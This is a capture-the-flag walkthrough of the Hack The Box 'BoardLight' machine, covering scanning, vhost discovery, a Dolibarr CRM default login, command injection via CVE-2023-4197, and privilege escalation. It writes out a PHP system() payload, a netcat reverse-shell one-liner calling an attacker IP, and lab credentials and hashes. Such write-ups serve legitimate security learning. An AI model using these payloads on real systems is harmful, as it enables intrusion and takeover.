---
title: HTB-Boardlight
draft: false
tags:
  - htb
  - enum4linux
---
pic here

## Information Gathering
### Rustscan
`rustscan --addresses 10.10.11.11 --range 1-65535`

![alt text](image-1.png)

## Enumeration
### HTTP - TCP 80

>  BoardLight is a cybersecurity consulting firm specializing in providing cutting-edge security solutions to protect your business from cyber threats 

![alt text](image.png)

board.htb

![alt text](image-2.png)

portfolio.php

![alt text](image-3.png)

![alt text](image-4.png)

`sudo gobuster vhost --append-domain -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](image-7.png)

### crm.board.htb

![alt text](image-5.png)

![alt text](image-6.png)

`http://crm.board.htb/user/passwordforgotten.php`

![alt text](image.png)

admin:admin

![alt text](image-8.png)


## Shell as www-data
### CVE-2023-4197

https://nvd.nist.gov/vuln/detail/CVE-2023-4197

![alt text](image-9.png)

https://starlabs.sg/advisories/23/23-4197/

![alt text](image-10.png)

This change ensures that full PHP tags <?php ... ?> are used instead of short tags <? ... ?>, which may not be enabled on all servers.

```php
"htmlheader": f"<? echo system('{cmd}'); ?>"
```

```php
"htmlheader": f"<?php echo system('{cmd}'); ?>"
```


![alt text](image-11.png)

### Reverse Shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 1337 >/tmp/f

![alt text](image-12.png)

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![alt text](image-13.png)

## Privesc: www-data to larissa

![alt text](image-14.png)

![alt text](image-15.png)

From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql

![alt text](image-16.png)

![alt text](image-17.png)
CVE-2022-37706



### Local Enumeration
![alt text](image-21.png)


![alt text](image-18.png)

![alt text](image-19.png)

dolibarrowner
serverfun2$2023!!

![alt text](image-20.png)

## Privesc: Larissa to root

![alt text](image-23.png)

![alt text](image-22.png)

![alt text](image-24.png)

`select * from llx_user;`


| login    | pass_crypted                                                 | lastname   |
|----------|--------------------------------------------------------------|------------|
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | SuperAdmin |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | admin      |


`find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`

![alt text](image-25.png)

https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

![alt text](image-26.png)